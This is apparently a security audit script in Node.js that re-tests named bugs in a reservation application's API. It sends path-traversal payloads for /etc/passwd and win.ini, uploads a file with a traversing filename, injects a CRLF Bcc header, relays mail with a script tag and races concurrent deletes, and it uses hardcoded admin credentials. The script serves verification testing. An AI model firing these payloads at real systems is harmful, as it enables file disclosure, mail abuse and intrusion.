// BUG-075 pg_dump leak, BUG-076 backup upload filename, BUG-081 mail relay,
// BUG-090 delete race, BUG-097 traversal payloads, BUG-100 from-header.
const { Session, BASE } = require('./lib.cjs');
const fs = require('fs'); const path = require('path'); const os = require('os');
const PW = 'P36brgss!23';
function log(t, r, x) { console.log(t.padEnd(60), r.status, (x === undefined ? r.text : x).toString().slice(0, 230).replace(/\s+/g, ' ')); }
const BS = String.fromCharCode(92);

(async () => {
  const m = new Session('mgr', { fakeIp: '203.0.113.221' });
  console.log('manager login', (await m.loginStaff('AUDIT-P36B-manager', PW)).status);
  const admin = new Session('admin', { fakeIp: '203.0.113.222' });
  console.log('admin login', (await admin.loginStaff('admin', 'admin123')).status);

  console.log('\n=== BUG-075 GET /api/backups/download-data ===');
  const dd = await m.get('/api/backups/download-data');
  const body = dd.text;
  console.log('status', dd.status, 'content-type', dd.headers.get('content-type'), 'bytes', body.length);
  console.log('body contains "postgres://":', /postgres:\/\//.test(body), '| "password":', /password/i.test(body.slice(0, 4000)), '| "pg_dump":', /pg_dump/.test(body.slice(0, 4000)));
  console.log('first 220 chars:', body.slice(0, 220).replace(/\s+/g, ' '));

  console.log('\n=== BUG-097 traversal payloads on /api/backups/download ===');
  const payloads = ['..%2f..%2f..%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..' + BS + '..' + BS + '..' + BS + 'Windows' + BS + 'win.ini', 'C:' + BS + 'Windows' + BS + 'win.ini',
    BS + BS + 'localhost' + BS + 'c$' + BS + 'Windows' + BS + 'win.ini', '..%252f..%252fetc%252fpasswd'];
  let four00 = 0, other = [];
  for (const p of payloads) {
    for (const route of ['/api/backups/download/database/' + p, '/api/backups/download/' + p]) {
      const r = await m.get(route);
      const ct = r.headers.get('content-type') || '';
      if (r.status === 400) four00++; else other.push(route + ' -> ' + r.status + ' ' + ct + ' ' + r.text.slice(0, 60).replace(/\s+/g, ' '));
    }
  }
  console.log('400 count:', four00, '/ 12');
  other.forEach((o) => console.log('  NOT 400:', o));

  console.log('\n=== BUG-076 backup upload with a traversing originalname ===');
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'AUDIT-P36B-up-'));
  const sqlPath = path.join(tmp, 'plain.sql');
  fs.writeFileSync(sqlPath, '-- AUDIT-P36B harmless dump\nSELECT 1;\n');
  async function uploadBackup(name) {
    const b = '----AUDITP36B' + Date.now() + Math.random().toString(36).slice(2);
    const parts = [
      Buffer.from('--' + b + '\r\nContent-Disposition: form-data; name="type"\r\n\r\ndatabase\r\n'),
      Buffer.from('--' + b + '\r\nContent-Disposition: form-data; name="backup"; filename="' + name + '"\r\nContent-Type: application/sql\r\n\r\n'),
      fs.readFileSync(sqlPath), Buffer.from('\r\n--' + b + '--\r\n')];
    return m.request('POST', '/api/backups/upload', Buffer.concat(parts), { raw: true, headers: { 'Content-Type': 'multipart/form-data; boundary=' + b } });
  }
  log('upload filename="../../AUDIT-P36B-esc.sql"', await uploadBackup('../../AUDIT-P36B-esc.sql'));
  log('upload filename="AUDIT-P36B-plain.sql"', await uploadBackup('AUDIT-P36B-plain.sql'));

  console.log('\n=== BUG-100 fromName / fromEmail validation ===');
  log('POST /api/app-settings email fromName with CRLF', await m.post('/api/app-settings', { key: 'config', category: 'email', value: JSON.stringify({ fromName: 'AUDIT-P36B"' + String.fromCharCode(13, 10) + 'Bcc: evil@example.com', fromEmail: 'a@b.nl', smtpHost: 'smtp.example.com', smtpPort: '587' }) }));
  log('POST /api/app-settings email fromEmail not an address', await m.post('/api/app-settings', { key: 'config', category: 'email', value: JSON.stringify({ fromName: 'AUDIT-P36B', fromEmail: 'not-an-address', smtpHost: 'smtp.example.com', smtpPort: '587' }) }));

  console.log('\n=== BUG-081 document e-mail to an unrelated address ===');
  const docs = await admin.get('/api/documents?limit=1');
  const docId = Array.isArray(docs.json) ? (docs.json[0] || {}).id : (docs.json && docs.json.data ? docs.json.data[0].id : undefined);
  console.log('document id used:', docId);
  if (docId) {
    log('POST /api/documents/' + docId + '/email to attacker@example.invalid',
      await m.post('/api/documents/' + docId + '/email', { recipients: 'AUDIT-P36B-attacker@example.invalid', subject: 'AUDIT-P36B', message: '<script>alert(1)</script>' }));
  }

  console.log('\n=== BUG-090 concurrent DELETE on one reservation ===');
  const rs = await admin.post('/api/reservations', { vehicleId: 2, customerId: 1, startDate: '2027-06-01', endDate: '2027-06-05', status: 'pending', type: 'standard' });
  const rid = rs.json && rs.json.id; console.log('fixture reservation', rs.status, rid);
  if (rid) {
    const s1 = new Session('d1', { fakeIp: '203.0.113.223' }); await s1.loginStaff('AUDIT-P36B-manager', PW);
    const s2 = new Session('d2', { fakeIp: '203.0.113.224' }); await s2.loginStaff('admin', 'admin123');
    const [r1, r2] = await Promise.all([s1.del('/api/reservations/' + rid), s2.del('/api/reservations/' + rid)]);
    console.log('concurrent DELETE statuses:', r1.status, r2.status);
    console.log('  body1:', r1.text.slice(0, 150).replace(/\s+/g, ' '));
    console.log('  body2:', r2.text.slice(0, 150).replace(/\s+/g, ' '));
  }
})().catch((e) => console.error('FATAL', e));
